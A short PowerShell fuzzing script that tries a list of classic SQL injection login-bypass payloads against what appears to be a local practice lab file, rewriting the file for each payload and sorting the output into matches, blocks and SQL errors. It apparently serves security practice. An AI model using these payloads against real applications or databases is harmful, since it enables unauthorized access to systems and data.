# Define an array of payloads using simple string formatting
$payloads = @(
    "' OR 1=1 -- ",
    "' OR 1=1--",
    "' OR '1'='1' -- ",
    "admin' -- ",
    "' OR 1=1 #",
    '\" OR 1=1 -- '
)

Write-Host "=========================================" -ForegroundColor Cyan
Write-Host " STARTING AUTOMATED SQLI PAYLOAD FUZZER  " -ForegroundColor Cyan
Write-Host "=========================================" -ForegroundColor Cyan

foreach ($payload in $payloads) {
    Write-Host "`nTesting Payload: [$payload]" -ForegroundColor Yellow
    
    # 1. Dynamically rewrite the payload line inside sql_injection_lab.py
    (Get-Content .\sql_injection_lab.py) -replace 'payload = .*', "payload = `"$payload`"" | Set-Content .\sql_injection_lab.py
    
    # 2. Execute the modified Python script using the local virtual environment
    $output = .\.venv\Scripts\python.exe .\sql_injection_lab.py 2>&1
    
    # 3. Parse and highlight the results based on engine behavior
    foreach ($line in $output) {
        if ($line -like "*MATCH FOUND*") {
            Write-Host "  [+] VULNERABLE ROUTE: $line" -ForegroundColor Green
        } elseif ($line -like "*NO MATCH*") {
            Write-Host "  [-] BLOCKED/NO MATCH: $line" -ForegroundColor DarkGray
        } elseif ($line -like "*SQL error*") {
            Write-Host "  [!] SYNTAX ERROR EXPOSED: $line" -ForegroundColor Red
        } else {
            Write-Host "      $line" -ForegroundColor White
        }
    }
}
